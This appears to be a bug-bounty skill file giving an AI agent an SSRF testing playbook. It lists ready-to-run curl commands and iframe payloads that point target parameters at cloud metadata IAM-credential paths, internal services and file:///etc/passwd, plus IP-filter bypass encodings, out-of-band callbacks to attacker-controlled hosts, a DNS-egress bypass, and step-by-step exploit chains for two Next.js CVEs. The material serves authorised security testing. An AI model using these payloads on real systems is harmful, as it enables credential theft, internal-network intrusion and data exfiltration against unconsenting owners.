---
name: ssrf-testing
description: SSRF (Server-Side Request Forgery) hunting command reference — parameter identification (url=/redirect=/webhook/callback-shaped params), cloud metadata endpoint targeting (169.254.169.254), local-service/internal-network probing, IP-filter bypass encodings (decimal/octal/hex/IPv6/short-form), and blind SSRF confirmation via Interactsh/Burp Collaborator OOB callbacks. Use this during Phase 3 (Vulnerability Testing — Server-side) of bughunting-workflow whenever a parameter accepts a URL, file path, or webhook/callback destination. Also trigger on mentions of SSRF, 169.254.169.254, metadata endpoint, Burp Collaborator, Interactsh, or internal service probing.
---

# SSRF (Server-Side Request Forgery) Testing

Command-reference library for finding and confirming SSRF. Add new entries as new filter-bypass encodings or cloud-provider-specific metadata paths get validated from future writeups.

## Core theory

SSRF happens when server-side code fetches a URL built from (or directly equal to) user input — image proxies, webhook registration, PDF/link-preview generators, "import from URL" features, and any `url=`/`callback=`/`redirect=` parameter are the canonical targets. Confirmation has two flavors:
- **Non-blind:** the response body reflects the fetched content back (fetch cloud metadata, see the IAM credentials in the response).
- **Blind:** no reflection, but the server made the outbound request — confirm via an OOB callback (Interactsh/Burp Collaborator) and correlate the DNS/HTTP hit with your test timing.

**DNS-restricted egress note:** if the target network blocks DNS resolution to arbitrary external domains (common egress hardening specifically meant to prevent OOB-callback confirmation), a `curl --resolve host:port:ip` on the executing side hardcodes the OOB domain to its real IP and skips the DNS lookup entirely while still sending the correct `Host` header — defeats a DNS-restriction control specifically, not an IP-level egress firewall. See `rce-exploitation-testing`'s cron-execution entry for the full worked example (used there to reach an oastify.com Interactsh callback from inside a cron-triggered blind-RCE chain).

## Recorded technique: SSRF command reference
Source: [Recon to Master: The Complete Bug Bounty Checklist](https://infosecwriteups.com/recon-to-master-the-complete-bug-bounty-checklist-95b80ea55ff0)

### Parameter identification
```bash
cat urls.txt | grep -E 'url=|uri=|redirect=|next=|data=|path=|dest=|proxy=|file=|img=|out=|continue=' | sort -u
cat urls.txt | grep -i 'webhook\|callback\|upload\|fetch\|import\|api' | sort -u
cat params.txt | grep -iE "(url|uri|path|src|dest|redirect|redir|return|next|target|out|view|page|show|fetch|load)"
```
Don't stop at obviously URL-shaped params — any **email input field** that triggers a server-side action keyed on its domain part (verification-email dispatch, MX/deliverability lookup, Gravatar-style avatar fetch, new-signup webhook to a CRM) is the same SSRF surface via a non-obvious injection point. See `email-field-injection-testing` technique #1 for the full email-specific exploit steps (payloads, IP-literal-rejected fallback via an attacker-controlled domain, OOB confirmation).

### Nuclei automated pass
```bash
cat urls.txt | nuclei -t nuclei-templates/vulnerabilities/ssrf/
cat domains.txt | nuclei -t blind-ssrf.yaml -c 30 -dast
```
`-dast` mode actively fuzzes injection points rather than only matching static request templates — pair the blind-ssrf template with a follow-up "Response SSRF" pass once a blind hit confirms the server makes the outbound request: retarget the same injection point at an internal file path (`file:///etc/passwd`, or an internal HTTP endpoint) to see whether the response is *this* time reflected back, escalating a blind (OOB-only) finding into one with direct data exfiltration. (Source for both: a curated private template collection at `https://github.com/coffinxp/nuclei-templates`.)

### Local-service / internal-network probing
```bash
curl "https://target.com/page?url=http://127.0.0.1:80/"
curl "https://target.com/page?url=http://localhost:8080"
```
Sweep common internal ports (Redis 6379, Elasticsearch 9200, admin panels on 8080/8443/9090) once basic localhost access is confirmed — internal services often have no auth at all, assuming they're unreachable from outside.

### Cloud metadata targeting (highest-value if it lands)
```bash
curl "https://target.com/api?endpoint=http://169.254.169.254/latest/meta-data/"
curl "https://target.com/api?endpoint=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
cat urls.txt | qsreplace "http://169.254.169.254/latest/meta-data/" | httpx-toolkit -silent -match-string "ami-id"
```
`169.254.169.254` is the AWS/most-cloud-providers link-local metadata address — successfully reaching `iam/security-credentials/` and pulling a role name means you can typically chain to full temporary AWS credentials for that instance's IAM role. Azure (`169.254.169.254/metadata/instance` + `Metadata: true` header) and GCP (`metadata.google.internal` + `Metadata-Flavor: Google` header) have their own required headers — retry with those if the bare IP doesn't respond.

### IP-filter bypass encodings
When a naive filter blocks literal `127.0.0.1`/`localhost`/`169.254.169.254`, retry with an equivalent representation the filter's string match won't catch but the OS resolver still accepts:
```
http://127.0.0.1%23.google.com    # fragment/host-confusion trick
http://127.1                      # shortened loopback form
http://[::1]/                     # IPv6 loopback
http://0x7f000001                 # hex-encoded 127.0.0.1
http://017700000001               # octal-encoded 127.0.0.1
```

### Interactsh/Collaborator-based blind SSRF confirmation
```bash
curl "https://target.com/page?url=http://yourdomain.burpcollaborator.net"
cat urls.txt | gf ssrf | qsreplace "https://YOURBURP.oastify.com" | httpx-toolkit -silent
cat urls.txt | gf ssrf | qsreplace "http://7f000001.burpcollaborator.net" | httpx-toolkit -silent
```
The last form (`7f000001` = hex `127.0.0.1` as a subdomain label your Collaborator resolves) is DNS-rebinding-flavored: it confirms the server actually resolved and connected to the loopback address, not just that it made *any* outbound DNS query — check the Collaborator interaction log for both the DNS lookup and (if HTTP was attempted) the connection attempt.

**Gap-analysis framing for the encoding list above** (source: [Stop Guessing and Start Grepping: The Hacker's Masterclass in Regex](https://cyphernova1337.medium.com/stop-guessing-and-start-grepping-the-hackers-masterclass-in-regex-6a6e96cee549)) — every bypass encoding above exists because it falls outside *some* filter's regex. A WAF/URL-validator built to catch this class of bypass typically has to explicitly enumerate every loopback representation in one pattern, e.g.:
```
(?xi)
(?:(?P<scheme>https?|ftp|gopher|dict|file|ldap)://)
(?:(?P<credentials>[^:@\s]+:[^:@\s]+)@)?
(?P<host>
    (?:127\.0\.0\.1|0\.0\.0\.0|localhost) |
    (?:\[::[1]?\]|::[1]?) |
    (?:0x[0-9a-f]{1,2}\.){3}0x[0-9a-f]{1,2} |
    (?:0177\.0\.0\.01) |
    (?:2130706433) |
    (?:0x7f000001)
)
(?::(?P<port>\d{1,5}))?
(?P<path>/[^\s?]*)?
(?:\?(?P<query>[^\s#]*))?
```
Reasoning through what a filter like this *would* need to match (and cross-checking against what it actually blocks in testing, e.g. via response-timing/error-message differences on each variant) surfaces the encoding it forgot — full decimal-integer IP form (`http://2130706433/`, `127.0.0.1` as a single 32-bit int), a partial-octal form the pattern above doesn't fully generalize (`0177.0.0.1` mixed with non-padded octets), or a scheme the allowlist/denylist never considered (`gopher://`, `dict://`) are the classic misses. Treat any WAF/filter as a regex you can reverse-engineer from its blocked/allowed responses, not a black box — the same lookaround/character-class fluency used for the JS-secret extraction in `recon-scanning-toolkit` applies here to reading what the filter's pattern *doesn't* cover.

## Recorded technique: HTML-to-PDF rendering engine SSRF via injected `<iframe>`
Source: [Bug Bounty Recon & Vulnerability Cheat Sheet](https://medium.com/@t4nv1/bug-bounty-recon-vulnerability-cheat-sheet-12d9db390d7f)

**Where:** any "generate PDF/invoice/report" feature that converts user-controlled HTML into a PDF server-side (wkhtmltopdf, Puppeteer/headless Chrome, PhantomJS, and similar HTML-to-PDF engines are the common backends) — invoice generators, report exporters, receipt printers, document-signing previews.

**Root cause:** the rendering engine faithfully executes whatever HTML it's handed, including tags that trigger a server-side fetch (`<iframe>`, `<img>`, `<link>`, `<object>`) — if any part of the HTML fed into the renderer is user-controlled (a "notes" field, a custom template, an uploaded HTML snippet) rather than fully static, the renderer becomes an SSRF proxy that runs with the *server's* network position, not the browser's.

**Exploit steps / payloads:**
```html
<!-- OOB confirmation first -->
<iframe src="http://attacker-controlled-server.com"></iframe>

<!-- Cloud metadata credential theft -->
<iframe src="http://169.254.169.254/latest/meta-data/"></iframe>
<iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/"></iframe>

<!-- Local file read (many PDF engines also honor file:// URIs in iframe/img src) -->
<iframe src="file:///etc/passwd"></iframe>
```
1. Find any input that ends up inside the HTML template handed to the PDF/report generator.
2. Inject the OOB payload first to confirm the renderer fetches attacker infra at all (correlate via Interactsh/Collaborator or a simple netcat listener, same as any other blind SSRF).
3. Escalate to the metadata-endpoint payload — since the PDF-rendering process typically runs as a backend service (not a sandboxed browser tab), a successful `iam/security-credentials/` fetch reflected into the generated PDF (as rendered "content" instead of an error) hands you the instance's IAM role name/temp credentials directly in the output file.
4. Try `file://` for local file read if metadata access fails or isn't cloud-hosted — same iframe/img-src injection point, different scheme.

**Generalize note:** this is the same "server fetches attacker-supplied URL" root cause as the rest of this skill, but the *delivery mechanism* is unusual enough to check for explicitly — a target with no obvious `url=`/`webhook=` parameter can still be SSRF-vulnerable purely through an HTML-rendering feature (PDF export, email-template preview, screenshot-as-a-service). Treat every HTML-to-PDF/HTML-to-image conversion feature as an SSRF candidate even when it looks like a pure formatting/export feature with no "network" angle at all.

## Recorded technique: Next.js-specific SSRF surface — Image Optimization API, Middleware `Location`-header injection (CVE-2025-57822), and Server Actions redirect bypass (CVE-2024-34351)
Source: [SSRF Vulnerabilities in Next.js Targets](https://www.intigriti.com/researchers/blog/hacking-tools/ssrf-vulnerabilities-in-nextjs-targets)

**Where:** any target fingerprinted as Next.js (check for `/_next/` static-asset paths, an `x-powered-by: Next.js` header, or a `__NEXT_DATA__` script tag in the page source) — three separate, framework-specific SSRF surfaces exist independent of any application-level `url=`/`webhook=` parameter this skill's generic sweep already targets.

**1. Image Optimization API (`/_next/image`) — no CVE, config-dependent:**
- **Root cause:** Next.js's built-in image-optimization endpoint fetches and re-encodes an image from a URL you supply, but only from hosts explicitly allowlisted via `images.remotePatterns`/`images.domains` in `next.config.js` — unless that config uses a wildcard hostname:
  ```javascript
  const nextConfig = {
    images: { remotePatterns: [{ protocol: 'https', hostname: '**' }] },
  }
  ```
  A `hostname: '**'` (or an equally broad pattern) removes the allowlist's protective value entirely — the endpoint will fetch from *any* host.
- **Exploit steps:** probe `/_next/image?url=<target>&w=<width>&q=<quality>` with an attacker-controlled/internal/cloud-metadata URL as `url`; if the wildcard config is in place, the response is the fetched image re-encoded — confirming the fetch succeeded even without any error message. If the app doesn't use a wildcard, check whether any of the allowlisted hostnames themselves host an open-redirect endpoint — chaining through an allowlisted host's own open redirect (see `open-redirect-testing`) can still land the fetch on an attacker-chosen final destination despite the allowlist.

**2. Middleware SSRF via `Location`-header injection — CVE-2025-57822 (researcher: Dominik Prodinger, 5,000+ potentially vulnerable hosts identified):**
- **Root cause:** a Next.js Middleware implementation that passes the *entire* incoming response/request object — including unsanitized request headers — through to the `next()` method, rather than extracting only the specific fields it actually needs. An attacker-controlled `Location` header value on the inbound request ends up interpreted by the middleware chain as a redirect target it should itself follow/act on internally.
- **Exploit steps:** inject a crafted `Location` header (pointing at an internal address, cloud metadata endpoint, or your own OOB listener) on a request to any Next.js Middleware-gated route; if the middleware is vulnerable, its internal evaluation follows that injected value as a server-side redirect target rather than treating it as inert request metadata. Confirm via Interactsh/Collaborator the same way as any other blind SSRF in this skill.
- **Recon note:** given the disclosed scale (5,000+ hosts), check the target's Next.js version and middleware config against the CVE advisory directly rather than assuming a patched version — this is a checkbox item worth running on every Next.js target, not just ones with obviously custom middleware logic.

**3. Server Actions redirect-validation bypass — CVE-2024-34351 (Next.js ≤ v14.1.1, self-hosted deployments only):**
- **Root cause:** a Server Action that follows a relative-path redirect validates the redirect target with a `HEAD` request first (checking the response's `content-type` before proceeding), then performs the actual fetch as a `GET` — but the validation and the fetch are two separate requests, and nothing forces the server receiving the `HEAD` to answer identically to what it does for the subsequent `GET`.
- **Exploit steps:**
  1. Stand up an OAST/attacker-controlled server that responds to an incoming `HEAD` request with a "safe-looking" `content-type` (satisfying the validation check).
  2. Craft the request to the target's Server Action with a malicious/spoofed `Host` header pointing at your OAST server as the relative-redirect target.
  3. The target's `HEAD` validation request hits your server, gets the acceptable `content-type`, and passes.
  4. Your OAST server responds to that same interaction with a `302` redirect pointing at the *real* target (AWS metadata endpoint, an internal-only service) — because the validation step and the actual fetch are decoupled, the target's subsequent `GET` follows this second, attacker-controlled redirect without re-validating it.
  5. The target's Server Action now fetches (and typically streams back in its response) the content from the internal/metadata target, completing the SSRF.
- **Applicability check:** self-hosted Next.js only (a target deployed on Vercel's own managed infrastructure is not exploitable this way, since Vercel's routing layer sits in front differently) — confirm self-hosted deployment (custom domain with no `x-vercel-id` header, or an on-prem/Docker-deployed instance) before investing time in this chain.

**Impact framing:** all three chains reach the same escalation ceiling as this skill's generic cloud-metadata section — AWS/cloud IAM credential theft via the metadata endpoint is the headline outcome for #2 and #3 specifically; #1 (Image Optimization) is typically blind-confirmation-only (an internal-network-reachability oracle) unless the fetched-and-re-encoded image response itself leaks something readable. Cite the specific CVE ID and Next.js version in the report for #2/#3 — these are patchable framework bugs, not application-logic mistakes, so remediation guidance is "upgrade Next.js" rather than "fix your SSRF-prone code."

**Generalize note:** this is the same "server fetches attacker-influenced URL" root cause as the rest of this skill, but delivered through **framework-internal machinery** (an image proxy, a middleware chain, a Server Action's redirect-following) rather than an obvious application parameter — none of these three surfaces look like a `url=` parameter at first glance, so fingerprint the framework explicitly (Next.js version + self-hosted-vs-Vercel + middleware presence) as a standing step whenever a target's stack includes Next.js, rather than relying on the generic parameter sweep to stumble onto them.

## Impact framing for report

Severity scales with what's reachable: cloud IAM credential theft (critical — often leads to full account compromise) > internal service access (high, depends what's exposed — DB admin panels, internal APIs) > blind confirmation only via OOB with no further chaining (medium — still real, but pair with "what an attacker could reach" reasoning specific to the target's likely internal topology to justify severity).

**Client-side/browser-driven variant:** not every "SSRF" is the server itself making the request — a client-side path-traversal bug in a frontend resource loader (plugin loader, iframe/script `src` builder) can force the *victim's browser* to request `127.0.0.1`/internal addresses in the victim's own authenticated session context, which is a different (but still reportable, still real-impact) flavor than server-initiated SSRF. See `path-traversal-testing`'s Grafana CVE-2025-4123 entry for the exact traversal shape (same payload family that also produced XSS and open redirect on that target) — worth checking client-side routing/navigation logic for this pattern alongside the server-side parameter sweep above.

<!-- Add new recorded techniques below this line as new SSRF writeups are processed. -->
